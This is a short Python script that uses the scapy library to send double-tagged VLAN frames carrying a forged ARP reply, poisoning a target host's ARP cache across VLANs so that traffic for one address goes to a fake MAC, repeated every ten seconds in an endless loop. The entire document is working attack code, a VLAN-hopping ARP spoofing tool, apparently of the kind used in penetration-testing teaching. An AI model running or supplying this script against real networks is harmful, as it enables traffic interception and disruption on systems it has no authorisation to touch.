#!/usr/bin/python

import time
from scapy.all import sendp, ARP, Ether, Dot1Q

iface = "eth0"
target_ip = '192.168.13.23'
fake_ip = '192.168.13.5'
fake_mac = 'c0:d3:de:ad:be:ef'
our_vlan = 1
target_vlan = 2

packet = Ether() / \
         Dot1Q(vlan=our_vlan) / \
         Dot1Q(vlan=target_vlan) / \
         ARP(hwsrc=fake_mac,
             pdst=target_ip,
             psrc=fake_ip,
             op="is-at")

while True:
    sendp(packet, iface=iface)
    time.sleep(10)
